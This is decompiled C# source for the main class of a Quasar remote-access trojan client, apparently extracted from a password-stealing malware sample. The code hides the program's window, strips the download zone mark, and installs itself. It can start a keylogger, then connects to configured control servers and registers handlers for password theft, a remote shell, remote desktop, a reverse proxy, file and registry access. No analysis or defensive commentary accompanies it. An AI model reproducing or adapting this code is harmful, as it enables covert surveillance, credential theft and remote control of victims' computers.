// Decompiled with JetBrains decompiler
// Type: Quasar.Client.QuasarApplication
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Quasar.Client.Config;
using Quasar.Client.Logging;
using Quasar.Client.Messages;
using Quasar.Client.Networking;
using Quasar.Client.Setup;
using Quasar.Client.User;
using Quasar.Client.Utilities;
using Quasar.Common.DNS;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client
{
  public class QuasarApplication : Form
  {
    public SingleInstanceMutex ApplicationMutex;
    private QuasarClient _connectClient;
    private readonly List<IMessageProcessor> _messageProcessors;
    private KeyloggerService _keyloggerService;
    private ActivityDetection _userActivityDetection;
    private readonly NotifyIcon _notifyIcon;

    private bool IsInstallationRequired => Settings.INSTALL && Settings.INSTALLPATH != Application.ExecutablePath;

    public QuasarApplication()
    {
      this._messageProcessors = new List<IMessageProcessor>();
      this._notifyIcon = new NotifyIcon();
    }

    protected override void OnLoad(EventArgs e)
    {
      this.Visible = false;
      this.ShowInTaskbar = false;
      this.Run();
      base.OnLoad(e);
    }

    private void InitializeNotifyicon()
    {
      this._notifyIcon.Text = "";
      this._notifyIcon.Visible = false;
      try
      {
        this._notifyIcon.Icon = Icon.ExtractAssociatedIcon(Assembly.GetExecutingAssembly().Location);
      }
      catch (Exception ex)
      {
        this._notifyIcon.Icon = SystemIcons.Application;
      }
    }

    public void Run()
    {
      if (!Settings.Initialize())
        Environment.Exit(1);
      this.ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);
      if (!this.ApplicationMutex.CreatedNew)
        Environment.Exit(2);
      FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);
      ClientInstaller clientInstaller = new ClientInstaller();
      if (this.IsInstallationRequired)
      {
        this.ApplicationMutex.Dispose();
        try
        {
          clientInstaller.Install();
          Environment.Exit(3);
        }
        catch (Exception ex)
        {
        }
      }
      else
      {
        try
        {
          clientInstaller.ApplySettings();
        }
        catch (Exception ex)
        {
        }
        if (!Settings.UNATTENDEDMODE)
          this.InitializeNotifyicon();
        if (Settings.ENABLELOGGER)
        {
          this._keyloggerService = new KeyloggerService();
          this._keyloggerService.Start();
        }
        this._connectClient = new QuasarClient(new HostsManager(new HostsConverter().RawHostsToList(Settings.HOSTS)), Settings.SERVERCERTIFICATE);
        this._connectClient.ClientState += new Quasar.Client.Networking.Client.ClientStateEventHandler(this.ConnectClientOnClientState);
        this.InitializeMessageProcessors(this._connectClient);
        this._userActivityDetection = new ActivityDetection(this._connectClient);
        this._userActivityDetection.Start();
        new Thread((ThreadStart) (() =>
        {
          this._connectClient.ConnectLoop();
          Environment.Exit(0);
        })).Start();
      }
    }

    private void ConnectClientOnClientState(Quasar.Client.Networking.Client s, bool connected)
    {
      if (connected)
        this._notifyIcon.Text = "Quasar Client\nConnection established";
      else
        this._notifyIcon.Text = "Quasar Client\nNo connection";
    }

    private void InitializeMessageProcessors(QuasarClient client)
    {
      this._messageProcessors.Add((IMessageProcessor) new ClientServicesHandler(this, client));
      this._messageProcessors.Add((IMessageProcessor) new FileManagerHandler(client));
      this._messageProcessors.Add((IMessageProcessor) new KeyloggerHandler());
      this._messageProcessors.Add((IMessageProcessor) new MessageBoxHandler());
      this._messageProcessors.Add((IMessageProcessor) new PasswordRecoveryHandler());
      this._messageProcessors.Add((IMessageProcessor) new RegistryHandler());
      this._messageProcessors.Add((IMessageProcessor) new RemoteDesktopHandler());
      this._messageProcessors.Add((IMessageProcessor) new RemoteShellHandler(client));
      this._messageProcessors.Add((IMessageProcessor) new ReverseProxyHandler(client));
      this._messageProcessors.Add((IMessageProcessor) new ShutdownHandler());
      this._messageProcessors.Add((IMessageProcessor) new StartupManagerHandler());
      this._messageProcessors.Add((IMessageProcessor) new SystemInformationHandler());
      this._messageProcessors.Add((IMessageProcessor) new TaskManagerHandler(client));
      this._messageProcessors.Add((IMessageProcessor) new TcpConnectionsHandler());
      this._messageProcessors.Add((IMessageProcessor) new WebsiteVisitorHandler());
      foreach (IMessageProcessor messageProcessor1 in this._messageProcessors)
      {
        MessageHandler.Register(messageProcessor1);
        if (messageProcessor1 is NotificationMessageProcessor messageProcessor2)
          messageProcessor2.ProgressChanged += new MessageProcessorBase<string>.ReportProgressEventHandler(this.ShowNotification);
      }
    }

    private void CleanupMessageProcessors()
    {
      foreach (IMessageProcessor messageProcessor1 in this._messageProcessors)
      {
        MessageHandler.Unregister(messageProcessor1);
        if (messageProcessor1 is NotificationMessageProcessor messageProcessor2)
          messageProcessor2.ProgressChanged -= new MessageProcessorBase<string>.ReportProgressEventHandler(this.ShowNotification);
        if (messageProcessor1 is IDisposable disposable)
          disposable.Dispose();
      }
    }

    private void ShowNotification(object sender, string value)
    {
      if (Settings.UNATTENDEDMODE)
        return;
      this._notifyIcon.ShowBalloonTip(4000, "Quasar Client", value, ToolTipIcon.Info);
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing)
      {
        this.CleanupMessageProcessors();
        this._keyloggerService?.Dispose();
        this._userActivityDetection?.Dispose();
        this.ApplicationMutex?.Dispose();
        this._connectClient?.Dispose();
        this._notifyIcon.Visible = false;
        this._notifyIcon.Dispose();
      }
      base.Dispose(disposing);
    }
  }
}
